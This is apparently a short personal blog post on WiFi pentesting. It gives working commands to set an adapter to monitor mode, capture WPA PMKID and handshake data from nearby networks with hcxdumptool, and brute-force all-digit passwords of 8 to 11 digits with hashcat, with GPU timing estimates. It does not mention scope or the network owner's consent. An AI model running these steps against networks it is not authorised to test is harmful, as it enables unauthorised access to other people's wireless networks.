+++
title = "Simple WiFi pentest"
date = "2023-11-16T20:36:04+04:00"
author = "gals"
authorTwitter = "" #do not include @
cover = ""
tags = ["wifi", "kali", "gentoo", "orange pi5"]
keywords = ["wifi", "kali", "gentoo", "orange pi5"]
description = "Simple WiFi pentest"
showFullContent = false
readingTime = true
hideComments = true
color = "" #color from the theme settings
+++

# Simple WiFi pentest

## Hardware
1. Orange Pi 5 + TP-Link Archer T2U PLUS [RTL8821AU] with [Kali Linux](https://github.com/leeboby/kali-images). Don't forget to do `rm /boot/*cloud-arm64* && /usr/sbin/u-boot-update`  after `apt update && apt upgrade` otherwise you can't boot after reboot
2. Gentoo with GeForce RTX 3070 Lite Hash Rate

## Orange PI 5

### Prepare

```bash
apt update
apt install tshark hcxdumptool hcxtools iw
```

### Run

```bash
# Setup monitor mode
ip link set wlan0 down && iw wlan0 set monitor none && ip link set wlan0 up
# Run tool for hcxdumptool 6.3.1 (C) 2023 ZeroBeat
hcxdumptool -i wlan0 -w wlan0.pcapng
# wait
```

After or during waiting
```bash
# Dump to hc22000 file format, watch into 'PMKID (best)'
hcxpcapngtool -o wlan0.hc22000 wlan0.pcapng
# Get info from wlan0.hc22000
hcxhashtool -i wlan0.hc22000 --info=stdout
```

## Gentoo

### Prepare

```bash
eselect repository enable pentoo
eix-sync
eix-update
emerge hcxtools
```

### Try to find something interesting

Simle ans stupid brute force, all digest from 000000000 (minimal wifi password length) to 999999999999 (like mobile phone number)

```shell
hashcat -m 22000 wlan0.hc22000 -a3 --increment -w3 \
  --increment-max 11 \
  --increment-min 8 \
  '?d?d?d?d?d?d?d?d?d?d?d'
# press s to check status
# run any time if you want get current status with the found
hashcat -m 22000 wlan0.hc22000 --show
```

**Timings:**
- 8 digits ~ 18 minutes
- 9 digits ~ 3 hours
- 10 digits ~ 1 day, 5 hours
- 11 digist ~ 12 days, 9 hours
